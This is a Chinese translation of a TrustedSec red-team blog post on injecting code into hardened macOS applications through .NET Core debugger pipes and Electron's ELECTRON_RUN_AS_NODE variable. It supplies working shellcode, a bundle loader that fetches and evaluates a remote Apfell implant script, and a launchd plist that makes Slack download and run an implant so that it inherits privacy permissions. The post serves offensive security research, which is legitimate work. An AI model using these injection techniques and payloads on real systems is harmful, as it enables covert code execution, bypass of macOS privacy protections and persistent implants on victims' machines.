> 原文链接: https://www.anquanke.com//post/id/218373 


# 通过第三方框架注入macOS


                                阅读量   
                                **218934**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者trustedsec，文章来源：trustedsec.com
                                <br>原文地址：[https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p2.ssl.qhimg.com/t0194d6ef9292013789.jpg)](https://p2.ssl.qhimg.com/t0194d6ef9292013789.jpg)



自从加入TrustedSec AETR团队以来，我花了一些时间研究MacOS环境下的攻击技术。不幸的是对我们这些攻击者来说，对于macOS系统的攻击是越来越难的。苹果公司通过隐私保护、沙箱和一层套一层的权限关系，使得通过注入方式操控macOS系统成为了几乎不可能的事情。

苹果花费大量精力阻止了通过进程注入进行`post-exploitation`。过去，我们可以在一个目标进程上调用`task_for_pid`，以此来获取它的`Mach`端口，然后调用`mach_vm_ dance`来分配和读写内存。时至今日，这些API的调用受到了严格的限制，只允许root用户调用这些函数。当然，这也意味着只要二进制文件没有`hardened runtime`标志时，它就不是带有Apple签名的二进制文件，这样它们甚至可以阻止root用户查看他们在内存中的文件。

在这篇文章中，我们将看到利用第三方框架实现代码注入的几种有趣的方法。对我们来说，这意味着在目标应用程序中运行代码，而不关闭macOS系统的系统完整性保护（System Integrity Protection ，SIP）。

提示：这篇文章中展示的两种技术都不是MacOS特有的，它们在Linux和Windows系统上都能很好地工作。但由于苹果对进程注入的严格限制，这篇文章主要关注它们对MacOS的影响。

让我们从一种我们都很熟悉的`.NET Core`框架开始。



## .NET CORE框架

微软的.NET Core框架是一种流行的跨平台应用和软件开发工具包（SDK），它是我们最喜欢的.NET应用开发平台之一。跨平台版本的PowerShell 就是由.NET Core框架支撑的，而在这篇文章中，PowerShell将作为我们的初始测试平台来使用。

为了展示我们在MacOS上向进程进行注入时的复杂程度，我们先通过传统方式对API`task_for_pid`进行注入。一个简单的注入方法如下：

```
kern_return_t kret; 
mach_port_t task; 

kret = task_for_pid(mach_task_self(), atoi(argv[1]), &amp;task); 
if (kret!=KERN_SUCCESS) 
`{` 
    printf("task_for_pid() failed: %s!\n",mach_error_string(kret)); 
`}` else `{` 
    printf("task_for_pid() succeeded\n"); 
`}`
```

当在我们的目标系统中运行PowerShell进程时，我们收到了预料之中的错误提示：

[![](https://p3.ssl.qhimg.com/t01a06828f90ea91258.png)](https://p3.ssl.qhimg.com/t01a06828f90ea91258.png)

但是如果我们以root用户身份运行呢？我们尝试运行一个没有`hardened runtime`标志的应用程序，它可以正常运行：

[![](https://p2.ssl.qhimg.com/t015296057cbf36e154.png)](https://p2.ssl.qhimg.com/t015296057cbf36e154.png)

但是当我们开始尝试通过一个使用了`hardened runtime`标志的应用程序进行此操作，我们就会看到同样熟悉的错误提示：

[![](https://p5.ssl.qhimg.com/t01f53a66b131383845.png)](https://p5.ssl.qhimg.com/t01f53a66b131383845.png)

如果我们使用类似LLDB的工具，它拥有`com.apple.security.cs.debugger`的强大权限，会发生什么呢？使用一个非root用户可以成功访问一个没有`hardened runtime`标志的进程，但是与此同时我们也会收到一个警告用户的对话框：

[![](https://p5.ssl.qhimg.com/t014df000e9eac71b95.png)](https://p5.ssl.qhimg.com/t014df000e9eac71b95.png)

同样，即使我们以root身份运行LLDB，我们也不能调试带有`hardened runtime`标志的进程：

[![](https://p5.ssl.qhimg.com/t01173b1f81198c7479.png)](https://p5.ssl.qhimg.com/t01173b1f81198c7479.png)

总之，这意味着只有当我们是root用户时，才可以注入到没有`hardened runtime`标志签名的.NET Core进程中。

没有一个很好的漏洞可以使用的话，苹果的API对我们来说毫无用处。我们怎么才能控制我们的目标：.NET Core进程呢？要做到这一点，我们应该仔细看看运行时源代码，它可以从[这里](https://github.com/dotnet/runtime)获得。



## 对.NET CORE的调试

让我们从头开始，尝试理解像Visual Studio Code这样的调试器是如何与.NET Core进程交互的。

我们看一下`dbgtransportsession.cpp`中的.NET Core源代码，这个部分负责调试通信，我们可以看到在函数`DbgTransportSession::Init`中创建了一系列命名管道。

这些管道在MacOS(和Unix)的情况下是使用以下代码创建的先进先出（FIFO）管道：

```
if (mkfifo(m_inPipeName, S_IRWXU) == -1) 
`{` 
    return false; 
`}` 
unlink(m_outPipeName); 
if (mkfifo(m_outPipeName, S_IRWXU) == -1) 
`{` 
    unlink(m_inPipeName); 
    return false; 
`}`
```

要查看实际操作，我们可以启动PowerShell。通过PowerShell可以看到在当前用户的`$TMPDIR`中创建了两个命名管道，管道名附加了`PID`，并在最后备注了`in`或`out`：

[![](https://p0.ssl.qhimg.com/t01ffebb1bcb4ce69ba.png)](https://p0.ssl.qhimg.com/t01ffebb1bcb4ce69ba.png)

了解了命名管道的位置和用途后，我们如何与目标进程通信呢？这个问题的答案在`DbgTransportSession::TransportWorker`方法中，它处理来自调试器的传入连接。

通读这些代码后，我们看到调试器需要做的第一件事是创建一个新的调试会话：通过`out`管道发送一个以`MessageHeader`结构开头的消息，我们可以从.NET源代码看到创建过程：

```
struct MessageHeader 
`{` 
    MessageType   m_eType;        // Type of message this is 
    DWORD         m_cbDataBlock;  // Size of data block that immediately follows this header (can be zero) 
    DWORD         m_dwId;         // Message ID assigned by the sender of this message 
    DWORD         m_dwReplyId;    // Message ID that this is a reply to (used by messages such as MT_GetDCB) 
    DWORD         m_dwLastSeenId; // Message ID last seen by sender (receiver can discard up to here from send queue)     DWORD         m_dwReserved;   // Reserved for future expansion (must be initialized to zero and                                             // never read)     union `{` 
        struct `{` 
           DWORD         m_dwMajorVersion;   // Protocol version requested/accepted 
           DWORD         m_dwMinorVersion; 
        `}` VersionInfo; 
         ... 
    `}` TypeSpecificData; 

    BYTE                    m_sMustBeZero[8]; 
`}`
```

在新会话请求的情况下，这个结构体被填充如下：

```
static const DWORD kCurrentMajorVersion = 2; 
static const DWORD kCurrentMinorVersion = 0; 

// Set the message type (in this case, we're establishing a session) 
sSendHeader.m_eType = MT_SessionRequest; 

// Set the version
sSendHeader.TypeSpecificData.VersionInfo.m_dwMajorVersion = kCurrentMajorVersion;
sSendHeader.TypeSpecificData.VersionInfo.m_dwMinorVersion = kCurrentMinorVersion; 

// Finally set the number of bytes which follow this header 
sSendHeader.m_cbDataBlock = sizeof(SessionRequestData);
```

构造完成后，我们使用系统调用`write`发送给目标：

```
write(wr, &amp;sSendHeader, sizeof(MessageHeader));
```

随后我们需要发送一个`sessionRequestData`结构体，它包含一个GUID来识别我们的会话：

```
// All '9' is a GUID.. right?
memset(&amp;sDataBlock.m_sSessionID, 9, sizeof(SessionRequestData)); 

// Send over the session request data 
write(wr, &amp;sDataBlock, sizeof(SessionRequestData));
```

在发送我们的会话请求时，我们从`out`管道中读取一个数值，它将告诉我们是否成功建立调试会话：

```
read(rd, &amp;sReceiveHeader, sizeof(MessageHeader));
```

如果一切正常，现在我们已经与目标建立了调试器会话。既然我们可以与目标进程通讯，那么我们可以使用哪些功能呢？如果我们查看运行时公开的消息类型，我们会看到两个有趣的基础类型，`MT_ReadMemory`和`MT_WriteMemory`。

它们允许我们读写目标进程的内存。我们可以在典型的MacOS API调用之外读写内存，这给了我们进入.NET Core进程内存的一个后门。

让我们从尝试从目标进程中读取一些内存开始。与我们创建会话的步骤一样，我们用：

```
// We increment this for each request
sSendHeader.m_dwId++; 

// This needs to be set to the ID of our previous response 
sSendHeader.m_dwLastSeenId = sReceiveHeader.m_dwId; 

// Similar to above, this indicates which ID we are responding to 
sSendHeader.m_dwReplyId = sReceiveHeader.m_dwId; 

// The type of request we are making
sSendHeader.m_eType = MT_ReadMemory;

// How many bytes will follow this header
sSendHeader.m_cbDataBlock = 0;
```

这一次，我们也提供了一个我们想从目标中读取的地址：

```
// Address to read from
sSendHeader.TypeSpecificData.MemoryAccess.m_pbLeftSideBuffer = (PBYTE)addr; 

// Number of bytes to read
sSendHeader.TypeSpecificData.MemoryAccess.m_cbLeftSideBuffer = len;
```

让我们测试一下分配一些非托管内存：

```
[System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi("HAHA, MacOS be protectin' me!")
```

我们使用[这个](https://gist.github.com/xpn/95eefc14918998853f6e0ab48d9f7b0b)代码可以很容易地读取该内存。运行结果如下：

[![](https://p4.ssl.qhimg.com/t0183c8142b4fcb110a.png)](https://p4.ssl.qhimg.com/t0183c8142b4fcb110a.png)

当然，我们反过来使用，使用`MT_WriteMemory`命令注入到PowerShell中来覆盖内存：<br>
图8向PowerShell注入内存

用于执行此操作的POC代码可以在[这里](https://gist.github.com/xpn/7c3040a7398808747e158a25745380a5)找到。



## .NET CORE代码执行

我们的重点是将代码注入到PowerShell中，如何将读/写基础类型转换为代码执行呢？我们没有能力改变内存保护，这意味着如果我们想引入shell代码之类的东西，只能写入标记为可写和可执行的内存页。

利用我们的简单POC，让我们标识一个RWX内存页并在那里托管我们的shell代码。苹果限制了我们枚举远程进程地址空间的能力，然而，我们可以访问`vmmap`（感谢Patrick Wardle，他在[这篇](https://objective-see.com/blog/blog_0x3E.html)文章中展示了这项技术），其中包含许多授权，包括`com.apple.system-task-ports`，它允许工具访问目标的`Mach`端口。

如果我们对PowerShell执行`vmmap -p [PID]`，我们看到许多有趣的内存区域适合托管我们的代码，下面重点展示’ rwx/rwx ‘权限：

[![](https://p3.ssl.qhimg.com/t0115efc59d3463860d.png)](https://p3.ssl.qhimg.com/t0115efc59d3463860d.png)

现在我们知道了注入shellcode的地址，我们需要找到一个可以写入的地方来执行这段代码。函数指针在这里是一个理想的候选对象，并且不需要花费很长时间就可以找到许多。我们使用的方法是覆盖动态函数表（DFT）中的指针，它被.NET Core runtime运行时使用。功能是为JIT编译提供帮助函数。在`jithelper .h`中可以找到函数指针列表。

找到一个指向DFT的指针是很简单的，特别是我们使用了`mimikatz-esque`工具的签名搜索技术在`libcorclr.dll`中搜索`_hlpDynamicFuncTable`的引用，然后我们解除它的引用：

[![](https://p0.ssl.qhimg.com/t0184cebdab4aa14533.png)](https://p0.ssl.qhimg.com/t0184cebdab4aa14533.png)

接下来要做的就是找到一个开始搜索签名的地址。为此，我们利用另一个公开的调试器函数`MT_GetDCB`。它会返回许多关于目标进程的有用信息，其中包含helper函数`m_helperRemoteStartAddr`的地址。使用这个地址，我们就知道了`libcorclr.dll`在目标进程内存中的位置，然后我们就可以开始搜索DFT了。

现在我们已经有了注入和执行代码所需的所有代码块，让我们尝试将一些shellcode写入RWX内存页，并通过DFT传输代码执行。在这种情况下，我们的shellcode将非常简单，只需在PowerShell提示符上显示一条消息，然后返回执行到CLR：

```
[BITS 64]

section .text 
_start: 
; Avoid running multiple times 
    cmp byte [rel already_run], 1 
    je skip 

; Save our regs 
    push rax 
    push rbx 
    push rcx 
    push rdx 
    push rbp 
    push rsi 
    push rdi 

; Make our write() syscall 
    mov rax, 0x2000004 
    mov rdi, 1 
    lea rsi, [rel msg] 
    mov rdx, msg.len 
    syscall

; Restore our regs 
    pop rdi 
    pop rsi 
    pop rbp 
    pop rdx 
    pop rcx 
    pop rbx 
    pop rax 
    mov byte [rel already_run], 1  

skip: 
; Return execution (patched in later by our loader) 
    mov rax, 0x4141414141414141 
    jmp rax 

msg: db 0xa,0xa,'WHO NEEDS AMSI?? ;) Injection test by @_xpn_',0xa,0xa 
.len: equ $ - msg 
already_run: db 0
```

在[这里](https://gist.github.com/xpn/b427998c8b3924ab1d63c89d273734b6)可以找到用于注入PowerShell的完整POC代码。



## Hardened Runtime功能是否会阻止代码运行？

现在我们有能力将其注入到.NET Core进程中，一个明显的问题是，`hardened runtime`功能是否会阻止它的运行。从我所看到的情况来看，是否设置了`hardened runtime`标志对我们的调试管道没有影响，这意味着我们的注入行为对于带有`hardened runtime`标志签名的应用程序仍然奏效。

让我们以另一个流行的应用程序为例，它已经签名、公证并带有`hardened runtime`签名标志，Fiddler：

[![](https://p1.ssl.qhimg.com/t017270576b173abc5e.png)](https://p1.ssl.qhimg.com/t017270576b173abc5e.png)

在这里我们发现其带有`hardened runtime`签名标志，但我们可以看到，启动应用程序仍然导致调试管道被成功创建：

[![](https://p1.ssl.qhimg.com/t0143414557156887e3.png)](https://p1.ssl.qhimg.com/t0143414557156887e3.png)

让我们通过尝试向Fiddler中注入一些shellcode来确保一切都能正常工作。这一次，我们将做一些更有用的事情，在`Cody Thomas‘ Mythic`框架中注入`Apfell`。

有几种方法可以做到这一点，但为了保持过程简单，我们将使用`wNSCreateObjectFileImageFromMemory`方法从磁盘加载一个bundle：

```
[BITS 64] 

NSLINKMODULE_OPTION_PRIVATE equ 0x2

section .text 
_start: 
    cmp byte [rel already_run], 1 
    je skip  

; Update our flag so we don't run every time 
    mov byte [rel already_run], 1  

; Store registers for later restore 
    push rax 
    push rbx 
    push rcx 
    push rdx 
    push rbp 
    push rsi 
    push rdi 
    push r8 
    push r9 
    push r10 
    push r11 
    push r12 
    push r13 
    push r14 
    push r15 

    sub rsp, 16 

; call malloc 
    mov rdi, [rel BundleLen] 
    mov rax, [rel malloc] 
    call rax 
    mov qword [rsp], rax  

; open the bundle 
    lea rdi, [rel BundlePath] 
    mov rsi, 0 
    mov rax, 0x2000005 
    syscall  

; read the rest of the bundle into alloc memory 
    mov rsi, qword [rsp] 
    mov rdi, rax 
    mov rdx, [rel BundleLen] 
    mov rax, 0x2000003 
    syscall 

    pop rdi 
    add rsp, 8  

; Then we need to start loading our bundle 
    sub rsp, 16 
    lea rdx, [rsp] 
    mov rsi, [rel BundleLen] 
    mov rax, [rel NSCreateObjectFileImageFromMemory] 
    call rax 

    mov rdi, qword [rsp] 
    lea rsi, [rel symbol] 
    mov rdx, NSLINKMODULE_OPTION_PRIVATE 
    mov rax, [rel NSLinkModule] 
    call rax 

    add rsp, 16 
    lea rsi, [rel symbol] 
    mov rdi, rax 
    mov rax, [rel NSLookupSymbolInModule] 
    call rax 

    mov rdi, rax 
    mov rax, [rel NSAddressOfSymbol] 
    call rax 

; Call our bundle exported function 
    call rax 

; Restore previous registers 
    pop r15 
    pop r14 
    pop r13 
    pop r12 
    pop r11 
    pop r10 
    pop r9 
    pop r8 
    pop rdi 
    pop rsi 
    pop rbp 
    pop rdx 
    pop rcx 
    pop rbx 
    pop rax 

; Return execution 
skip: 
    mov rax, [rel retaddr] 
    jmp rax 

symbol: db '_run',0x0 
already_run: db 0  

; Addresses updated by launcher 
retaddr:                dq 0x4141414141414141
malloc:                 dq 0x4242424242424242
NSCreateObjectFileImageFromMemory: dq 0x4343434343434343
NSLinkModule:           dq 0x4444444444444444
NSLookupSymbolInModule: dq 0x4545454545454545
NSAddressOfSymbol:      dq 0x4646464646464646
BundleLen:              dq 0x4747474747474747

; Path where bundle is stored on disk
BundlePath:             resb 0x20
```

我们将要加载的包是一个非常简单的JXA执行：

```
#include &lt;stdio.h&gt;
#include &lt;pthread.h&gt;
#import &lt;Foundation/Foundation.h&gt;
#import &lt;OSAKit/OSAKit.h&gt;

void threadStart(void* param) `{`
    OSAScript *scriptNAME= [[OSAScript alloc] initWithSource:@"eval(ObjC.unwrap( $.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://127.0.0.1:8111/apfell-4.js')), $.NSUTF8StringEncoding)));" language:[OSALanguage languageForName:@"JavaScript"] ];
    NSDictionary * errorDict = nil;
    NSAppleEventDescriptor * returnDescriptor = [scriptNAME executeAndReturnError: &amp;errorDict];
`}`

int run(void) `{`
#ifdef STEAL_THREAD
    threadStart(NULL);
#else
    pthread_t thread;
    pthread_create(&amp;thread, NULL, &amp;threadStart, NULL);
#endif
`}`
```

注入`Apfell implant`的POC代码可以在[这里](https://gist.github.com/xpn/ce5e085b0c69d27e6538179e46bcab3c)找到。

另外，可以在苹果APP商店找到的`Electron`框架也可以被注入。



## Electron框架注入

正如我们现在所知道的，`Electron`是一个框架，它允许web应用程序移植到桌面，并且它被用于安全存储RAM。

那么，我们如何在一个经过签名和带有`hardened runtime`标志的应用程序中执行代码呢？我们通过引入环境变量`ELECTRON_RUN_AS_NODE`。

这个环境变量将`Electron`应用程序转换为常规的旧`NodeJS REPL`。例如，让我们从App Store中选取一个流行的应用程序，比如`Slack`，并设置`ELECTRON_RUN_AS_NODE`环境变量来启动进程：

[![](https://p0.ssl.qhimg.com/t014432bca484ea3846.png)](https://p0.ssl.qhimg.com/t014432bca484ea3846.png)

你会看到它用Visual Studio Code也可以正常工作：

[![](https://p0.ssl.qhimg.com/t01596f4d9fcd27d222.png)](https://p0.ssl.qhimg.com/t01596f4d9fcd27d222.png)

Discord：

[![](https://p3.ssl.qhimg.com/t017f9dbd7ad7b97d24.png)](https://p3.ssl.qhimg.com/t017f9dbd7ad7b97d24.png)

甚至BloodHound：

[![](https://p2.ssl.qhimg.com/t01e5190bdf2e031637.png)](https://p2.ssl.qhimg.com/t01e5190bdf2e031637.png)

那么，这对我们来说意味着什么呢？在MacOS环境中，这意味着，我们可以很容易地通过执行`ELECTRON_RUN_AS_NODE`环境变量，让我们的NodeJS代码被执行。

让我们以Slack为例（尽管任何应用程序都可以很好地工作），并利用它对桌面和文档的访问来解决TCC问题。在MacOS中，一个子进程将从父进程继承TCC权限，这意味着我们可以使用`NodeJS`派生一个子进程，比如`Apfell 's implant`，它将继承所有用户授予的隐私切换权限。

为了做到这一点，我们先打开Electron：

```
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;
&lt;plist version="1.0"&gt;
&lt;dict&gt;
    &lt;key&gt;EnvironmentVariables&lt;/key&gt;
    &lt;dict&gt;
           &lt;key&gt;ELECTRON_RUN_AS_NODE&lt;/key&gt;
           &lt;string&gt;true&lt;/string&gt;
    &lt;/dict&gt;
    &lt;key&gt;Label&lt;/key&gt;
    &lt;string&gt;com.xpnsec.hideme&lt;/string&gt;
    &lt;key&gt;ProgramArguments&lt;/key&gt;
    &lt;array&gt;
        &lt;string&gt;/Applications/Slack.app/Contents/MacOS/Slack&lt;/string&gt;
        &lt;string&gt;-e&lt;/string&gt;
        &lt;string&gt;const `{` spawn `}` = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);&lt;/string&gt;
    &lt;/array&gt;
    &lt;key&gt;RunAtLoad&lt;/key&gt;
    &lt;true/&gt;
&lt;/dict&gt;
&lt;/plist&gt;
```

然后我们使用`ELECTRON_RUN_AS_NODE`环境变量，通过`OSAScript`执行`Apfell`：

```
launchctl load /tmp/loadme.plist
```

如果一切顺利，你将被返回一个shell，正如预期的那样:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t011ebd890abc59ae18.png)

通常，当我们请求类似于`~/Downloads`的内容时，你会期望不显示给用户任何提示。如果你在未经允许的情况下请求访问任何内容，我们可以让合法应用显示一个提示：

图18

[![](https://p4.ssl.qhimg.com/t018ab7930b03611c89.png)](https://p4.ssl.qhimg.com/t018ab7930b03611c89.png)

以上就是本篇内容，我们通过利用第三方框架公开的功能来绕过MacOS进程注入限制。许多应用程序都暴露在这种注入技术中，考虑到苹果对MacOS生态系统的限制，这令人十分的惊讶。我们希望通过公开这些技术和POC代码，可以帮助红队修复MacOS的漏洞。
